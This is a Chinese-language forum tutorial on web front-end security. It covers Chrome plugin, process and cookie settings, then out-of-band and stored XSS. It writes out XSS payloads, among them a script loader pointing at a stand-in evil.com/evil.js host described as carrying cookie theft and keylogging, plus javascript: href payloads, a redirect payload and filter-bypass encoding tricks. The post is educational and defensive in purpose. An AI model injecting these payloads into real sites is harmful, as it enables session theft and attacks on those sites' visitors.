
# web基础设施知识；web前端安全攻防，客户端安全基础

## 前言

一段时间没来看雪了，最近在学习web前端安全，鉴于这个板块的基础文章较少，下面发一个web安全基础知识帖，其中总结了这段时间的学习心得体会。

该帖最初是在我的51cto博客上发表的，[74cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4Z5j5i4W2A6x3e0V1^5x3#2)9J5k6h3u0D9L8$3N6Q4x3X3f1#2x3h3y4@1L8#2)9J5k6h3y4G2L8g2)9J5c8U0b7$3z5o6p5^5x3K6g2Q4x3V1j5I4y4U0t1J5x3U0f1J5](https://bbs.kanxue.com/elink@a5fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4Z5j5i4W2A6x3e0V1^5x3#2)9J5k6h3u0D9L8$3N6Q4x3X3f1#2x3h3y4@1L8#2)9J5k6h3y4G2L8g2)9J5c8U0b7$3z5o6p5^5x3K6g2Q4x3V1j5I4y4U0t1J5x3U0f1J5)，只是将其转到这里来，由于个人所学有限，其中错误之处还请包涵并指正。我会持续更新原帖的内容并在这里同步。

## 《google chrome浏览器安全冲浪部分》

1。直接在chrome的地址栏输入`chrome://plugins/`后回车，可以打开当前chrome安装的浏览器插件列表，可以单独禁用或者启用某个插件，查看每个插件的本地存储路径（通常作为chrome加载的第三方DLL），对于那些版本较低的插件，要么将其更新为最新状态，要么将其禁用，因为多数旧版插件包括已公布的安全漏洞，使用浏览器访问需要运行这些插件的站点时，可能会触发漏洞。

![](https://bbs.kanxue.com/upload/attach/201503/533967_bb4b2a5f5a9c3a12.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_dd7b8f9200b6803e.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_17142ff44796a0c8.jpg)

2。在chrome的任意打开的标签页中，按下热键`shift+esc`，将会打开chrome的“任务管理器”，由于chrome是以多进程模型运行的应用程序，所以在任务管理器中可以查看到当前运行的所有chrome进程。

![](https://bbs.kanxue.com/upload/attach/201503/533967_b91aab542c35db10.jpg)

与HTTP Switchboard 扩展不同，adobe shockwave flash player 插件只会在浏览器运行flash内容时，作为单独的进程启动，也就是按需启动。

例如，我们以chrome打开自己的51cto博客页面，由于个人博客主页并没有任何flash内容，因此并不会运行单独的chrome进程加载adobe shockwave flash player 插件，但是，如果我们点击发表文章，并点击上传图片的按钮，那么浏览器将运行包含flash的内容，从而让用户能够选择图片上传的方案，此时就会启动单独的chrome进程，并且将adobe shockwave flash player的动态链接库作为第三方DLL加载。

![](https://bbs.kanxue.com/upload/attach/201503/533967_114c70cd38e57ab3.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_b8f28866b1eb5ab7.jpg)

在chrome的任务管理器显示中，每个打开的标签页都是一个独立的渲染进程；每个渲染进程中的web页面内容，以及javascript代码都被认为是不可信的，因此它们运行在受限制的沙箱环境中，该环境主要用于限制前者对本地文件系统（如 cookie），内存数据（如复制到剪切版中，还未清除的帐户密码），网络（如通过操作系统的 TCP/IP 协议栈服务，发起跨域请求）等关键系统资源的访问。

任务管理器中的“浏览器”进程，就是chrome的浏览器内核进程。

渲染进程中的javascript代码要访问上述系统资源，都需要通过进程间通信机制与浏览器内核进程进行数据交换，后者提供的API函数则会检查这些访问请求的合法性，并且添加额外的安全限制。

3。在chrome中逐站点管理cookie。点击右上角“设置”-> “显示高级设置”-> “隐私设置”栏目 -> “内容设置”->“所有cookie和网站数据”（勾选上方的“阻止第三方cookie和网站数据”复选框，可以拦截所有与当前加载的页面所属域不同的第三方域设置的cookie）

或者直接在chrome的地址栏输入字符串`chrome://settings/cookies`，也可以打开cookie管理窗口。

可以查看每个站点设置到本地存储的cookie详细信息，如下所示：

![](https://bbs.kanxue.com/upload/attach/201503/533967_c027fdc8c6a688f4.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_4de1af68a08cbab0.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_2fc1a225d0ff6525.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_ff08b037a284af99.jpg)

## 《关于带外型XSS》

带外型（Out of Band）XSS，又称二阶型或高阶型XSS，它是指XSS的有效载荷（下称payload）被注入到A站点，而B站点引用A站点的内容时，没有过滤或净化其中的payload，导致用户访问B站点时，浏览器直接执行payload。

例如，在google中搜索下面字符串：

```
"<title><script>src=http"
```

将会在搜索结果中列出页面标题被注入恶意javascript的页面，按理来讲，如果搜索引擎在引用这个页面并向用户显示之前，没有过滤或编码其中的尖括号等危险字符，那么客户端浏览器会将其当作“代码”执行。

实际上，google过滤掉了这些危险字符，因此浏览器将其当作“数据”显示，而非代码。如下所示：

![](https://bbs.kanxue.com/upload/attach/201503/533967_37d001be08e863c6.jpg)

强调一点，除了浏览器有内置的HTML渲染引擎，其它桌面应用以及移动设备应用同样也有，例如skype，但是这些应用的HTML渲染引擎通常没有web浏览器的HTML渲染引擎那么成熟，安全性（以及使用这些应用的用户的安全意识）也较差，以至于成为带外型XSS攻击的目标。

## 《一些 XSS payload/shellcode 测试用例全程实录》

下面是一个xss payload的例子：

（后续的博文中会不加区分“标签”，“元素”等HTML术语以及payload，shellcode等词汇的使用）

```
<script>

        var s = document.createElement("script");

        s.src = "a09K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0";

        document.getElementsByTagName("head")[0].appendChild(s);

</script>
```

第二行定义一个javascript变量`s`，用来存储创建的script元素；

第三行将script元素实例的`src`属性值设为百度首页；

第四行通过元素标签名访问head元素，将`s`添加到head的后面，即，将script元素添加到head元素的后面。

现在假设一个A站点中用于显示用户发表的“评论页面”中存在持久型跨站脚本漏洞，我们可以将上述xss shellcode当作评论发表，而持久型xss意味着该站点不会过滤开始与结束的script标签，直接将payload写入生成的HTML页面，

当其它用户浏览这个被公开访问的页面查看评论时，由web服务器将“被注入xss payload的HTML页面作为HTTP的响应体返回客户端”，客户端浏览器在渲染该页面时，javascript解释引擎执行上述脚本，从而触发漏洞。

为了简单起见，假设服务器用于向其它用户返回的被注入脚本的HTML页面源码如下所示：

```
<!DOCTYPE html>

<html lang="en">

    <head>

        <meta http-equiv="Content-type" content="text/html;charset=utf-8" />

        <title>XssPayloadTest</title>

    </head>

    <body>

        <script>

        var s = document.createElement("script");

        s.src = "cdaK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0";

        document.getElementsByTagName("head")[0].appendChild(s);

        </script>

    </body>

</html>
```

注意，上述代码中的head元素后面还没有script标签，因为body元素中的script标签中的javascript脚本还没有机会被执行；为了真实模拟出被注入页面在受害者机器上运行的效果，我们将上述代码复制到记事本或者其它文本编辑器中，保存成名为`XssPayloadTest.html`的html文件，然后分别以chrome，FireFox，IE 等浏览器打开该文件，此刻body元素中的脚本得以被执行。

通过浏览器开发者工具或者插件查看渲染后的HTML页面源码，查看其中的脚本执行后的效果：

![](https://bbs.kanxue.com/upload/attach/201503/533967_4e4e6a7e2ad770fc.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_769ebbeb000e6536.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_6c3325b0db9923b5.jpg)

通过上面IE开发者工具给出的信息可知，将script元素的`src`属性值设为某个域名时，浏览器会“下载”这个站点上的资源，在实际的攻击场景中，黑客会以类似下面的payload来注入，其中，`evil.com`是被黑客控制或其自行搭建的站点；`evil.js`文件内包含了更多的恶意javascript，例如实现客户端cookie窃取并发送到远程服务器的js；实现击键记录的js（用于捕获网络银行以及网络游戏的帐户密码）等等。

```
s.src = "0bbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2$3K9h3I4Q4x3X3g2U0L8$3#2Q4x3V1k6W2N6X3W2D9i4K6u0W2K9Y4x3`.";
```

一些博客评论页面通常会限制发表评论的字数，此时就需要通过这个“xss 小马”来加载“xss 大马”。

如果A站点仅仅简单地过滤`script`字符串及其两侧的尖括号，那么可以将shellcode以10进制或16进制编码，并且在每个编码后的字符串插入“”前缀，尝试绕过A站点的xss过滤系统。使用一个叫做“XSS Codec”的工具，就可以进行多重编码，例如将采用ASCII 10进制编码后的shellcode，以ASCII 16进制二次编码，这样，编码后的字符就会直接写入生成的HTML页面，返回客户端时，浏览器解码shellcode并执行：

![](https://bbs.kanxue.com/upload/attach/201503/533967_4953bb5c382293ba.jpg)

值得庆幸的是，在上面测试的三种浏览器中，都不会将编码后的带尖括号的script标签解释为HTML元素并作为DOM节点添加，相反，script标签会被视为字符串（即数据）直接输出到HTML页面中，从而阻止了xss shellcode的触发，以在chrome中测试的下面两张截图说明：

![](https://bbs.kanxue.com/upload/attach/201503/533967_af9cfa7ac395f9d5.jpg)

![](https://bbs.kanxue.com/upload/attach/201503/533967_1b4b1f6bd88aa046.jpg)

一些站点的XSS过滤器或者防御机制就是利用了浏览器上述行为特点，对即将要输出到客户端的数据进行适当格式的编码后，浏览器虽然会解码这些数据，但是不会将其当成代码执行，例如下面的例子：

```
<!DOCTYPE html>

<html lang="en">

    <head>

        <meta http-equiv="Content-type" content="text/html;charset=utf-8" />

        <title>XssPayloadTest</title>

         

    </head>

    <body>

        <!--<script>alert("xss!");</script>-->

        <!--

 

<script>alert("xss!");</

 

;script>-->

        <!--<script>alert("xss!");</script>-->

    </body>

</html>
```

上面第9行的shellcode是第15行的明文shellcode进行HTML编码后的结果；

第10~14行的shellcode则是第15行的明文shellcode进行HTML 16进制“\*;”

（\*代表任意的以x为前缀的16进制数，如 r ，是对字符 r 进行HTML 16进制编码后的结果）

编码后的结果，也就是说，三者是等价的。但是浏览器的解析结果却出现了差异：

首先取消注释第15行的shellcode，由于它是以明文写入HTML文档中的（没有经过任何编码），所以浏览器会把它当作代码执行，于是弹出提示框。

接着改成取消第9行，或者第10~14行的注释，然后在浏览器中测试结果，我们发现，三大浏览器均将其解码后，作为数据显示。这是对用户更友好的显示方式，因为用户更喜欢看到明确的字符，而不是编码后的字符，而实际上，在浏览器内部会使用编码后的表示，无论如何，如果编码后的shellcode就是服务器端的XSS过滤器最终返回给用户的结果（例如第9行，第10~14行），那么就成功地过滤掉了危险字符，并且阻止其在客户端浏览器中执行，以chrome为例：

![](https://bbs.kanxue.com/upload/attach/201503/533967_becc3f4a312a20c0.jpg)

关于浏览器如何解释HTML编码（HTML实体编码，非HTML 16进制编码），还有一个比较微妙的场景，在这个场景中，三大浏览器都会毫不“犹豫”地将编码后的数据当成代码执行。首先原始的shellcode如下：

```
<a href = "javascript:alert('xss!')">百度首页</a>
```

通过a元素的`href`属性注入的shellcode，在显示为“百度首页”的超链接上点击，就会弹出提示框；假设服务器端在返回给用户前，将冒号字符（:）进行HTML实体编码成“`&colon;`”，如下所示：

```
<a href = "javascript&colon;alert('xss!')">百度首页</a>　
```

shellcode仍旧会在浏览器中得到执行，弹出提示框。因此在这个场景中，仅仅执行一次编码后输出到客户端是不够的，需要对HTML实体编码格式中的“`&`”与“`;`”字符，执行二次编码，即URL百分号编码（与前面XSS编码器截图中的“`escape`编码”选项是一个道理），如下所示：

```
<a href = "javascript%26colon%3Balert('xss!')">百度首页</a>
```

其中，`26`与`3B`分别是ASCII字符`&`与`;`的16进制表示，分别对两者添加`%`前缀，这就是URL百分号编码的特点。这种形式的shellcode输出到客户端时，浏览器就不会将数据作为代码执行了。

各位要是有任何疑虑，可以分别将三种格式的shellcode在浏览器上测试验证，这里就不发图了。

下面这个xss payload用于将当前浏览器地址栏中的URL重定向到`href`后指定的URL：

```
<script>location.href="http://137K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0";</script>
```

将这个payload添加到`XssPayloadTest.html`文件的body元素内部，来模拟被注入的场景，然后用浏览器打开，添加之前的浏览器地址栏显示的应该是该文件的本地存储路径，例如：

`C:\Users\shayi\Desktop\XssPayloadTest.html`

在文本编辑器中添加后保存，用浏览器刷新该页面，地址栏就会变成百度首页，这说明`href`属性的值起到了重定向的作用，同样可用于重定向至`evil.com`。
